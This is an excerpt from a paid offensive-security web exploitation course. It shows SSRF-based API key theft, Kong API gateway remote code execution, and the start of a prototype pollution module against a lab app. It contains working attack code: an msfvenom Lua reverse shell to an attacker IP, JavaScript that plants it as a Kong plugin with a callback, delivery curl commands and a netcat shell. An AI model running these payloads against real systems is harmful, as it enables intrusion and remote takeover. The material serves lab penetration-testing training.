" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
HeadlessChrome/79.0.3945.0 Safari/537.36" 
192.168.120.135 - - [25/Feb/2021:13:34:24 -0500] "GET 
/callback?%7B%22next%22%3Anull%2C%22data%22%3A%5B%7B%22created_at%22%3A1613767827%2C%2
2id%22%3A%22c34c38b6-4589-4a1e-a8f7-
d2277f9fe405%22%2C%22tags%22%3Anull%2C%22ttl%22%3Anull%2C%22key%22%3A%22SBzrCb94o9JOWA
LBvDAZLnHo3s90smjC%22%2C%22consumer%22%3A%7B%22id%22%3A%22a8c78b54-1d08-43f8-acd2-
fb2c7be9e893%22%7D%7D%5D%7D HTTP/1.1" 404 491 "http://192.168.118.3/exfil.html" 
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
HeadlessChrome/79.0.3945.0 Safari/537.36" 
Listing 533 - JavaScript callback in access.log 
After decoding the data, we find the API key. 
{"next":null,"data":[{ 
  "created_at":1613767827, 
  "id":"c34c38b6-4589-4a1e-a8f7-d2277f9fe405", 
  "tags":null, 
  "ttl":null, 
  "key":"SBzrCb94o9JOWALBvDAZLnHo3s90smjC", 
  "consumer":{"id":"a8c78b54-1d08-43f8-acd2-fb2c7be9e893"}}]} 
Listing 534 - Decoded data 
Excellent. Now that we have the API key, we should be able to call the render endpoint through the 
API gateway without needing the SSRF vulnerability. 
 
273 (Kong Inc, 2021), https://docs.konghq.com/hub/kong-inc/key-auth/#paginate-through-keys 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
468 
12.6.3.1 Exercises 
1. 
Recreate the steps above to gain access to the API key. 
2. 
Without calling the File Import service, recreate the attack to steal credentials from Kong by 
calling the Render service directly with the API key. 
3. 
Adjust your HTML payload so the credentials are included in the PDF the service returns. 
12.6.3.2 Extra Mile 
Create a web server in your choice of programming language to handle the JavaScript callbacks 
and automatically URL-decode the data. 
12.6.4 URL to PDF Microservice Source Code Analysis 
The Render Service is an open-source URL to PDF microservice.274 The application’s 
documentation includes a warning about the risks of running this application publicly. This 
application was included in the lab environment and required authentication at the API gateway to 
simulate some commonly-encountered microservice environments. 
We have already exploited the headless browser this application uses. We will quickly review the 
application’s source code to increase our familiarity with NodeJS and determine what security 
controls are in place. 
The source code referenced in this section is also available from the course Wiki. 
In fact, the application includes some validation on the initial request. Let’s review the 
application’s router configuration found in /src/router.js. The relevant code is available on 
GitHub.275 We will start at the beginning of the file to review what dependencies it imports. 
01  const _ = require('lodash'); 
02  const validate = require('express-validation'); 
03  const express = require('express'); 
04  const render = require('./http/render-http'); 
05  const config = require('./config'); 
06  const logger = require('./util/logger')(__filename); 
07  const { renderQuerySchema, renderBodySchema, sharedQuerySchema } = 
require('./util/validation'); 
Listing 535 - imports 
The application imports the express276 framework (line 2) and the middleware express-validator277 
for validation (line 3). It also imports three custom validation objects on line 7. These objects will 
become important later on. 
 
274 (Alvar Carto, 2021), https://github.com/alvarcarto/url-to-pdf-api 
275 (GitHub, 2021), https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/router.js 
276 (StrongLoop and IBM, 2017)http://expressjs.com/ 
277 (express-validator, 2021), https://express-validator.github.io/docs/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
469 
Next, we’ll review the code that defines the route for GET requests to /api/render. The relevant 
code starts on line 29. 
29  const getRenderSchema = { 
30    query: renderQuerySchema, 
31    options: { 
32      allowUnknownBody: false, 
33      allowUnknownQuery: false, 
34    }, 
35  }; 
36  router.get('/api/render', validate(getRenderSchema), render.getRender); 
Listing 536 - Router and getRenderSchema definitions 
Line 36 defines the router for GET requests to /api/render. The first parameter to the render.get 
function is the URI path. The middle parameter is a validation function that receives the 
getRenderSchema object. The application calls the validation function before calling the handler 
function (set by the last parameter, or render.getRender). 
Let’s review the definition of the renderQuerySchema object which is available in 
/src/util/validation.js.278 
68  const renderQuerySchema = Joi.object({ 
69    url: urlSchema.required(), 
70  }).concat(sharedQuerySchema); 
Listing 537 - renderQuerySchema definition 
The renderQuerySchema definition is a Joi279 object. Joi is a schema definition and data validation 
library for NodeJS. The code defines a url parameter on line 69 with a value of 
urlSchema.required(). 
After 
the 
Joi 
object 
is 
created, 
the 
code 
concatenates 
the 
sharedQuerySchema object to it. This object contains additional schema definitions but isn’t 
important to our analysis. However, the urlSchema object is important. We can find its definition 
starting on line 3. 
03  const urlSchema = Joi.string().uri({ 
04    scheme: [ 
05      'http', 
06      'https', 
07    ], 
08  }); 
Listing 538 - urlSchema definition 
On line 3, urlSchema is set to a Joi.string().uri.280 This requires a string value to be a valid URL. The 
scheme parameter adds further restrictions to only allow HTTP or HTTPS protocols on the URL. 
These settings should prevent the application from processing a URL with the FILE protocol. 
We can verify this control by calling the service directly through the API gateway and submitting 
the file:///etc/passwd value in the url parameter. 
 
278 (GitHub, 2021), https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/util/validation.js 
279 (Sidway Inc, 2021), https://joi.dev/ 
280 (Sidway Inc, 2021), https://joi.dev/api/?v=17.4.0#stringurioptions 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
470 
kali@kali:~$ curl 
"http://apigateway:8000/render?url=file:///etc/passwd&apikey=SBzrCb94o9JOWALBvDAZLnHo3
s90smjC" 
{"status":400,"statusText":"Bad 
Request","errors":[{"field":["url"],"location":"query","messages":["\"url\" must be a 
valid uri with a scheme matching the http|https 
pattern"],"types":["string.uriCustomScheme"]}]} 
Listing 539 - Error message for the FILE protocol 
Instead of the file contents, we received an error that our url parameter isn’t valid. Additionally, 
Chrome itself will block a resource loaded over HTTP or HTTPS from accessing another resource 
with the FILE protocol. 
Now that we understand what validation is in place, let’s continue our analysis of how the 
application renders the URL we submit. According to Listing 536, render.getRender is the request 
handler function. 
This function is defined in /src/http/render-http.js.281 
01  const { URL } = require('url'); 
02  const _ = require('lodash'); 
03  const normalizeUrl = require('normalize-url'); 
04  const ex = require('../util/express'); 
05  const renderCore = require('../core/render-core'); 
06  const logger = require('../util/logger')(__filename); 
07  const config = require('../config'); 
... 
24  const getRender = ex.createRoute((req, res) => { 
25    const opts = getOptsFromQuery(req.query); 
26   
27    assertOptionsAllowed(opts); 
28    return renderCore.render(opts) 
29      .then((data) => { 
30        if (opts.attachmentName) { 
31          res.attachment(opts.attachmentName); 
32      } 
33      res.set('content-type', getMimeType(opts)); 
34      res.send(data); 
35    }); 
36  }); 
Listing 540 - render-http.getRender function 
The getRender function performs some additional validation by calling assertOptionsAllowed. We 
will not review this function in detail here. Our main interest is the renderCore.render function 
called on line 28. The application will return the results of that function as an attachment in the 
eventual server response (lines 31 - 34). 
This function is defined in /src/core/render-core.js.282 
Let’s start with the imports. 
 
281 (GitHub, 2021), https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/http/render-http.js 
282 (GitHub, 2021), https://github.com/alvarcarto/url-to-pdf-api/blob/master/src/core/render-core.js 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
471 
01  const puppeteer = require('puppeteer'); 
02  const _ = require('lodash'); 
03  const config = require('../config'); 
04  const logger = require('../util/logger')(__filename); 
Listing 541 - Import statements for render-core.js 
We can tell from the import statement on line 1 that this application uses puppeteer,283 a Node 
library for programmatically managing Chrome or Chromium. The render function starts on line 
41. We will focus on the highlights instead of reviewing every line of code in the function. 
041  async function render(_opts = {}) { 
042    const opts = _.merge({ 
...   
065    }, _opts); 
... 
075    const browser = await createBrowser(opts); 
076    const page = await browser.newPage(); 
... 
106    try { 
107      logger.info('Set browser viewport..'); 
108      await page.setViewport(opts.viewport); 
109      if (opts.emulateScreenMedia) { 
110        logger.info('Emulate @media screen..'); 
111        await page.emulateMedia('screen'); 
112      } 
... 
123      if (_.isString(opts.html)) { 
124        logger.info('Set HTML ..'); 
125        await page.setContent(opts.html, opts.goto); 
126      } else { 
127        logger.info(`Goto url ${opts.url} ..`); 
128        await page.goto(opts.url, opts.goto); 
129      } 
... 
Listing 542 - renderCore.render function 
The function declares a browser object on line 75. The createBrowser function, which creates a 
new browser process using puppeteer, sets the value of the object. On line 76, a new page is 
created. A page in this context can be thought of as single tab in the browser. The code then 
defines several response handlers, which we have omitted. Finally, on line 123, the function 
checks if HTML was submitted as part of the request. If not, the function loads the submitted 
URL in the browser. 
There is more code in this function to handle scrolling through the page and other user-defined 
options but we have covered the main points. Let’s review the end of the function. 
170      if (opts.output === 'pdf') { 
171        if (opts.pdf.fullPage) { 
172          const height = await getFullPageHeight(page); 
173          opts.pdf.height = height; 
174        } 
175        data = await page.pdf(opts.pdf); 
 
283 (Google, 2021), https://github.com/puppeteer/puppeteer#readme 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
472 
176      } else if (opts.output === 'html') { 
177        data = await page.evaluate(() => document.documentElement.innerHTML); 
178      } else { 
... 
206    return data; 
207  } 
Listing 543 - returning data 
If the requested output is a PDF, the function calls the page.pdf function and sets the results in 
the data variable. Otherwise, if the requested output format is HTML, the function instead calls 
page.evaluate, which returns the loaded page’s innerHtml element. 
As we discovered in Listing 540, the application returns the value of data as an attachment on the 
server response. 
While we have not found a way to leverage Headless Chrome and the URL to PDF microservice to 
access local files on the server, we do have the full range of executing JavaScript from the 
headless browser. This will prove to be very useful as we pivot to remote code execution. 
12.7 Remote Code Execution 
Exfiltrating data is a nice accomplishment, but let’s try to achieve remote code execution. We’ll 
begin by reviewing our potential targets. 
 
Figure 312: Network diagram 
Since we can execute arbitrary JavaScript via the Render service, we can send requests to any of 
the hosts in the internal network. The PostgreSQL database will be difficult to attack without 
credentials. The REDIS server seems enticing, but let’s focus on the Kong API Gateway since we 
already know we can access it via the Render service headless browser. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
473 
12.7.1 RCE in Kong Admin API 
After spending some time reviewing documentation for Kong API Gateway, the plugins seemed 
like a good area to focus on. We can’t install a custom plugin without the ability to restart Kong so 
we need to use the plugins already included. 
The Serverless Functions284 plugin has an interesting warning in its documentation: 
Warning: The pre-function and post-function serverless plugin allows anyone 
who can enable the plugin to execute arbitrary code. If your organization has 
security concerns about this, disable the plugin in your kong.conf file. 
That sounds perfect for our purposes! Let’s check if Kong has that plugin loaded. Our first call to 
the Kong API Gateway Admin API actually contained information about what plugins are enabled 
on the server. 
{"plugins":{"enabled_in_cluster":["key-auth"],"available_on_server":{"grpc-
web":true,"correlation-id":true,"pre-function":true,"cors":true,... 
Listing 544 - Excerpt of enabled plugins 
Since the pre-function plugin is enabled, let’s try to exploit that. The plugin runs Lua code so we’ll 
need to build a matching payload. We can use msfvenom to generate a reverse shell payload. 
kali@kali:~$ msfvenom -p cmd/unix/reverse_lua lhost=192.168.118.3 lport=8888 -f raw -o 
shell.lua 
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload 
[-] No arch selected, selecting arch: cmd from the payload 
No encoder specified, outputting raw payload 
Payload size: 223 bytes 
Saved as: shell.lua 
 
kali@kali:~$ cat shell.lua 
lua -e "local s=require('socket');local 
t=assert(s.tcp());t:connect('192.168.118.3',8888);while true do local 
r,x=t:receive();local f=assert(io.popen(r,'r'));local 
b=assert(f:read('*a'));t:send(b);end;f:close();t:close();" 
Listing 545 - Generating a Lua reverse shell 
Since we will be uploading a Lua file, we won’t need “lua -e” in the final version of the payload. 
According to the Kong documentation, we have to add a plugin to a Service. We could add the 
plugin to an existing Service, but let’s limit the exposure of it by creating a new Service. A Service 
needs a Route for us to call it. Let’s create a new HTML page with a JavaScript function that 
creates a Service, adds a Route to the Service, then adds our Lua code as a “pre-function” plugin 
to the Service. 
Any time we add users or modify applications during a security engagement, we 
should keep track of the changes and undo them at the end of the engagement. 
We never want to leave an application less secure than we found it. 
 
284 (Kong Inc, 2021), https://docs.konghq.com/hub/kong-inc/serverless-functions/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
474 
We can use our previous JavaScript function as a starting point for the new one. 
<html> 
<head> 
<script> 
 
function createService() { 
    fetch("http://172.16.16.2:8001/services", { 
      method: "post", 
      headers: { "Content-Type": "application/json" }, 
      body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"}) 
    }).then(function (route) { 
      createRoute(); 
    }); 
} 
 
function createRoute() { 
    fetch("http://172.16.16.2:8001/services/supersecret/routes", {  
      method: "post", 
      headers: { "Content-Type": "application/json" }, 
      body: JSON.stringify({"paths": ["/supersecret"]}) 
    }).then(function (plugin) { 
      createPlugin(); 
    });   
} 
 
function createPlugin() { 
    fetch("http://172.16.16.2:8001/services/supersecret/plugins", {  
      method: "post", 
      headers: { "Content-Type": "application/json" }, 
      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :[  REVERSE 
SHELL HERE ]}}) 
    }).then(function (callback) { 
      fetch("http://192.168.118.3/callback?setupComplete"); 
    });   
} 
</script> 
</head> 
<body onload='createService()'> 
<div></div> 
</body> 
</html> 
Listing 546 - Contents of rce.html 
In the code listing above, we use three sections to clarify the code and simplify updates. The 
page’s onload event calls the createService() function, which sends a POST request to create a 
new service named “supersecret”. The function then calls createRoute(). This function adds the 
/supersecret route to the new service. It then calls createPlugin(), which adds our Lua payload as 
a plugin on the service. Finally, it makes a GET request to our Kali host. 
To make debugging our attack easier, we could use fetch() to send the response 
of each call to Kong back to our Kali host. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
475 
Once this page is in our webroot, we can use curl to send it to the Render service. 
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d 
'{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.118.3/rce.html"}' 
http://apigateway:8000/files/import 
 
{"errors":[{"message":"You don't have permission to access 
this.","extensions":{"code":"FORBIDDEN"}}]} 
Listing 547 - Delivering the RCE payload 
If everything worked, we should have a “setupComplete” entry in our access.log file. 
kali@kali:~$ sudo tail /var/log/apache2/access.log 
... 
192.168.120.135 - - [25/Feb/2021:13:46:16 -0500] "GET /rce.html HTTP/1.1" 200 872 "-" 
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) 
HeadlessChrome/79.0.3945.0 Safari/537.36" 
192.168.120.135 - - [25/Feb/2021:13:46:16 -0500] "GET /callback?setupComplete 
HTTP/1.1" 404 491 "http://192.168.118.3/rce.html" "Mozilla/5.0 (X11; Linux x86_64) 
AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36" 
Listing 548 - Checking for setupComplete callback 
It seems like our payload worked. We will need to set up a Netcat listener and then trigger our Lua 
payload by accessing the new service endpoint. 
kali@kali:~$ curl -i  http://apigateway:8000/supersecret 
Listing 549 - Sending a request to the endpoint configured with our reverse shell plugin 
The request will hang, but if we check our Netcat listener, we should have a shell. 
kali@kali:~$ nc -nvlp 8888 
listening on [any] 8888 ... 
connect to [192.168.118.3] from (UNKNOWN) [192.168.120.135] 41764 
 
whoami 
kong 
 
ls -al 
total 72 
drwxr-xr-x    1 root     root          4096 Feb 19 20:49 . 
drwxr-xr-x    1 root     root          4096 Feb 19 20:49 .. 
-rwxr-xr-x    1 root     root             0 Feb 19 20:49 .dockerenv 
drwxr-xr-x    1 root     root          4096 Dec 17 14:57 bin 
drwxr-xr-x    5 root     root           340 Feb 25 14:38 dev 
-rwxrwxr-x    1 root     root          1236 Dec 17 14:57 docker-entrypoint.sh 
drwxr-xr-x    1 root     root          4096 Feb 19 20:49 etc 
drwxr-xr-x    1 root     root          4096 Dec 17 14:57 home 
... 
Listing 550 - Reverse shell from the Kong API Gateway server 
Our payload worked and we now have a reverse shell on the Kong API Gateway server. The 
presence of .dockerenv and docker-entrypoint.sh confirm our earlier suspicion that the servers 
were actually containers. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
476 
12.7.1.1 Exercise 
Finish the JavaScript payload and get your shell. 
12.7.1.2 Extra Mile 
1. 
The current reverse shell isn’t fully interactive and can cause the gateway to hang. Upgrade 
to a fully interactive shell. 
2. 
With the other plugins available in Kong API Gateway, find a way to log all traffic passing 
through the gateway. Inspect the traffic for any sensitive data. You should only need five to 
ten minutes worth of logging. The logging plugin can be disabled by sending a GET request 
to /plugins to get the plugin’s id, then sending a DELETE request to /plugins/{id}. Review the 
authentication documentation for Directus285 and use the logged data to gain access to a 
valid access token for Directus. 
12.8 Wrapping Up 
In this module, we expanded on our black box testing techniques by performing discovery and 
enumeration of API microservices. We discovered a service vulnerable to server side-request 
forgery and used that to bypass the API gateway to call service endpoints directly. Once we 
discovered a service running a headless browser, we used JavaScript to achieve remote code 
execution on the API gateway server. 
 
285 (Monospace Inc, 2020), https://docs.directus.io/reference/api/rest/authentication/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
477 
12.8.1.1.1 
 
13 Guacamole Lite Prototype Pollution 
Prototype pollution refers to a JavaScript vulnerability in which an attacker can inject properties in 
every object created by an application. While prototype pollution is not a new JavaScript concept, 
it has only recently become an attack vector. Server-side attacks using prototype pollution were 
popularized by Olivier Arteau in a talk given at NorthSec in October 2018.286 In this module, we will 
be concentrating on these server-side attacks. While client-side prototype pollution attacks exist, 
they are slightly different. 
Prototype pollution vulnerabilities often appear in libraries that merge or extend objects. For a 
web application to be vulnerable to prototype pollution in an exploitable way, it must use a 
vulnerable merge/extend function and provide a path to code execution or authentication bypass 
using the injected properties. 
Since this exploitation path is difficult, most online discussion surrounding this topic is 
theoretical. 
In order to practically demonstrate the vulnerability, we have created a basic application that uses 
guacamole-lite287 (a Node package for connecting to RDP clients via a browser) and various 
templating engines. Guacamole-lite uses a library that is vulnerable to prototype pollution when 
processing untrusted user input. We will leverage prototype pollution against two different 
templating engines to achieve RCE on the target. 
We’ll take a whitebox approach to teach the concepts, but we will also cover how we can discover 
a vulnerability like this using blackbox concepts. 
13.1 Getting Started 
To demonstrate this vulnerability, we created a target application, “Chips”, which provides access 
to RDP clients via a web interface. 
Before we begin exploiting, let’s first explore the target application, find the inputs, switch 
templating engines, and connect to it via a remote debugger. 
In order to access the Chips server, we have created a hosts file entry named “chips” on our Kali 
Linux VM. Make this change with the corresponding IP address on your Kali machine to follow 
along. Be sure to revert the Chips virtual machine from your student control panel before starting 
your work. The Chips box credentials are listed in the Wiki. 
Let’s start by visiting the Chips homepage and exploring the application. We’ll do this using Burp 
Suite and its browser in order to capture requests. 
When we connect, we are presented with a page that lists some container information, allows us 
to change the connection settings, and allows us to connect to the RDP client. The About section 
states “Your dev environment is one step away. Click connect to start the session”. This type of 
application might be used for demonstrating development environments.  
 
286 (Arteau, 2018), https://www.youtube.com/watch?v=LUsiFV3dsK8 
287 (Pronin, 2020), https://www.npmjs.com/package/guacamole-lite 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
478 
 
Figure 313: Chips Homepage 
When we click Connect, the application loads a new page with the desktop of the RDP client. 
 
Figure 314: Chips RDP Connection 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
479 
13.1.1.1.1 
 
By reviewing the requests in the Burp HTTP history, we find three interesting requests. First we 
discover a POST to /tokens containing a JSON payload with the connection information. 
 
Figure 315: Chips /token Request 
Next, we find a request to /rdp with a token query parameter containing a base64 payload. When 
decoded, the payload displays a JSON object containing “iv” and “value” parameters. Based on the 
existence of an “iv” parameter, we can assume that this payload is encrypted.288 This will be 
important later on. 
 
288 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Initialization_vector 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
480 
 
Figure 316: Chips /rdp Request 
Finally, we also find a GET request to /guaclite with the same token value discovered earlier. This 
request responds with a “101 Switching Protocols” response, which is used to start a WebSocket 
connection. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
481 
 
Figure 317: Chips /guaclite Request 
Considering that we have not found any HTTP requests that stream the image, sound, and mouse 
movements to the RDP client, we can assume that this is made through the WebSocket 
connection. We can confirm this by clicking on WebSockets history in Burp Suite and reviewing 
the captured information. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
482 
 
Figure 318: Chips Websocket Traffic 
Navigating back to the homepage in our browser, we also find an “Advanced Connection Settings” 
button, which presents the settings that were contained in the “/token” request. 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
483 
 
Figure 319: Chips Advanced Connection Settings 
We’ll target the three endpoints we discovered, beginning with a source code review of each one. 
13.1.2 Understanding the Code 
Let’s begin by downloading the code to our Kali machine using rsync. 
kali@kali:~$ rsync -az --compress-level=1 student@chips:/home/student/chips/ chips/ 
student@chips's password:  
Listing 472 - Downloading the Chips Source Code 
Next, we’ll open the source code in Visual Studio Code. 
kali@kali:~$ code -a chips/ 
Listing 551 - Opening Chips Source in VS Code 
The downloaded code has the following folder structure: 
chips/ 
├── app.js 
├── bin 
│   └── www 
├── docker-compose.yml 
├── Dockerfile 
├── .dockerignore 
├── frontend 
│   ├── index.js 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
484 
│   ├── rdp.js 
│   ├── root.js 
│   └── style 
├── node_modules 
│   ├── abbrev 
│   ├── accepts 
    ... 
├── package.json 
├── package-lock.json 
├── public 
│   ├── images 
│   └── js 
├── routes 
│   ├── files.js 
│   ├── index.js 
│   ├── rdp.js 
│   └── token.js 
├── settings 
│   ├── clientOptions.json 
│   ├── connectionOptions.json 
│   └── guacdOptions.json 
├── shared 
│   └── README.md 
├── version.txt 
├── views 
│   ├── ejs 
│   ├── hbs 
│   └── pug 
├── .vscode 
│   └── launch.json 
└── webpack.config.js 
Listing 552 - Chips Folder Structure 
The existence of bin/www, package.json, and routes/ indicate that this is a NodeJS web 
application. In particular, package.json identifies a NodeJS project and manages its 
dependencies.289 
The existence of the docker-compose.yml and Dockerfile files indicate that this application is 
started using Docker containers. 
Let’s review package.json to get more information about the application. 
01  { 
02    "name": "chips", 
03    "version": "1.0.0", 
04    "private": true, 
05    "scripts": { 
06      "start-dev": "node --inspect=0.0.0.0 ./bin/www", 
07      "watch": "webpack watch --mode development", 
08      "start": "webpack build --mode production && node ./bin/www", 
09      "build": "webpack build --mode development" 
10    }, 
 
289 (Lokesh, 2020), https://dev.to/devlcodes/file-structure-of-a-node-project-3opk 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
485 
11    "devDependencies": { 
12      "@babel/core": "^7.13.1", 
... 
24      "webpack": "^5.24.2", 
... 
33    }, 
34    "dependencies": { 
35      "cookie-parser": "~1.4.4", 
36      "debug": "~2.6.9", 
37      "dockerode": "^3.2.1", 
38      "dotenv": "^8.2.0", 
39      "ejs": "^3.1.6", 
40      "express": "~4.16.1", 
41      "guacamole-lite": "0.6.3", 
42      "hbs": "^4.1.1", 
43      "http-errors": "~1.6.3", 
44      "morgan": "~1.9.1", 
45      "pug": "^3.0.2" 
46    } 
47  } 
Listing 553 - Chips package.json 
We can learn three things from package.json. First, the application is started using the ./bin/www 
file (line 6). Second, we find that “Webpack” is installed (lines 7-10 and 24). Webpack is most often 
used to bundle external client side packages (like jQuery, Bootstrap, etc) and custom JavaScript 
code into a single file to be served by a web server. This means that the frontend directory will 
most likely contain all the frontend assets, including the code that started the WebSocket 
connection. Finally, the application is built using the “Express” web application framework (line 
40). This means that the routes directory will probably contain the definitions to the endpoints we 
discovered earlier. 
Let’s analyze ./bin/www to understand how the application is started. 
01  #!/usr/bin/env node 
... 
07  var app = require('../app'); 
08  var debug = require('debug')('app:server'); 
09  var http = require('http'); 
10  const GuacamoleLite = require('guacamole-lite'); 
11  const clientOptions = require("../settings/clientOptions.json") 
12  const guacdOptions = require("../settings/guacdOptions.json"); 
13 
... 
25  var server = http.createServer(app); 
26 
27  const guacServer = new GuacamoleLite({server}, guacdOptions, clientOptions); 
28 
29  /** 
30   * Listen on provided port, on all network interfaces. 
31   */ 
32 
33  server.listen(port); 
34  server.on('error', onError); 
35  server.on('listening', onListening); 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
486 
... 
 
Listing 554 - ./bin/www Source 
From this file we learn that app.js is loaded and used to create the server. Note that “.js” is omitted 
from require statements. On lines 33-35, the HTTP server is started. However, before it is started, 
the server is also passed into the GuacamoleLite constructor (line 27). This could allow the 
guacamole-lite package to create endpoints not defined in Express. 
Next, let’s review the app.js file. 
01  var createError = require('http-errors'); 
02  var express = require('express'); 
03  var path = require('path'); 
... 
11 
13  var app = express(); 
14 
15  // view engine setup 
16  t_engine = process.env.TEMPLATING_ENGINE; 
17  if (t_engine !== "hbs" && t_engine !== "ejs" && t_engine !== "pug" ) 
18  { 
19      t_engine = "hbs"; 
20  } 
21 
22 app.set('views', path.join(__dirname, 'views/' + t_engine)); 
23 app.set('view engine', t_engine); 
... 
30 
31  app.use('/', indexRouter); 
32  app.use('/token', tokenRouter); 
33  app.use('/rdp', rdpRouter); 
34 app.use('/files', filesRouter); 
... 
Listing 555 - Chips app.js File 
The app.js file sets up many parts of the application. Most importantly, we discover that two of 
the routes are defined on lines 32 and 33. We also find that lines 16-20 allow us to set the 
templating engine of the application to hbs(Handlebars), EJS, or Pug with the default being hbs. 
This is set via the TEMPLATING_ENGINE environment variable. This is an unusual feature for a 
web application. However, we added this into the application to easily allow us to switch between 
the various templating engines. We’ll use this to demonstrate multiple ways of leveraging 
prototype pollution against an application. 
hbs is Handlebars implemented for Express. However, it uses the original 
Handlebars library. From this point forward we will use “Handlebars” to refer to 
this templating engine. 
To show how to change the templating engine, we’ll review docker-compose.yml to better 
understand the layout of the application. 
1    version: '3' 
2    services: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
487 
3      chips: 
4        build: . 
5        command: npm run start-dev 
6        restart: always 
7        environment: 
8          - TEMPLATING_ENGINE 
9        volumes: 
10        - .:/usr/src/app 
11        - /var/run/docker.sock:/var/run/docker.sock 
12      ports: 
13        - "80:3000" 
14        - "9229:9229" 
15        - "9228:9228" 
16    guacd: 
17      restart: always 
18      image: linuxserver/guacd 
19      container_name: guacd 
20   
21    rdesktop: 
22      restart: always 
23      image: linuxserver/rdesktop 
24      container_name: rdesktop 
25      volumes: 
26        - ./shared:/shared 
27      environment: 
28        - PUID=1000 
29        - PGID=1000 
30        - TZ=Europe/London 
Listing 556 - docker-compose.yml 
Line 5 reveals that we can start the application with the start-dev script (from package.json). This 
script starts the application on port 9229 with debugging enabled. In production, this should never 
be set, but it is enabled here for easier debugging when we are attempting to exploit the target. 
This file also references the TEMPLATING_ENGINE environment variable on line 8. We can set this 
variable from the command line before running the docker-compose command. 
Finally, we find that web application container (chips) is started with /var/run/docker.sock 
mounted (line 11). This gives the chips container full access to the Docker socket. With access to 
the Docker socket, we may be able to escape the container and obtain RCE on the host if we can 
get RCE on the web app container.290 We can keep this in mind, but first we need to focus on 
understanding the application. 
Let’s try changing templating engines. First, we’ll stop the existing instance of the application with 
docker-compose down. 
kali@kali:~$ ssh student@chips 
... 
student@oswe:~$ cd chips/ 
 
student@oswe:~/chips$ docker-compose down 
Stopping chips_chips_1   ... done 
 
290 (Dejandayoff, 2019), https://dejandayoff.com/the-danger-of-exposing-docker.sock/ 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
488 
Stopping rdesktop        ... done 
Stopping guacd           ... done 
Removing chips_chips_1                ... done 
Removing chips_chips_run_b082290a7ff7 ... done 
Removing rdesktop                     ... done 
Removing guacd                        ... done 
Removing network chips_default 
Listing 557 - Stopping Application 
Once the application is stopped, we can start it and set TEMPLATING_ENGINE=ejs before the 
docker-compose up command. This will instruct app.js to use the EJS templating engine and the 
views found in the views/ejs folder. Starting the application should only take a couple of seconds. 
Once the logs start to slow down, the application should be started. 
student@oswe:~/chips$ TEMPLATING_ENGINE=ejs docker-compose up 
Starting rdesktop        ... done 
Starting chips_chips_1   ... done 
Starting guacd           ... done 
Attaching to guacd, chips_chips_1, rdesktop 
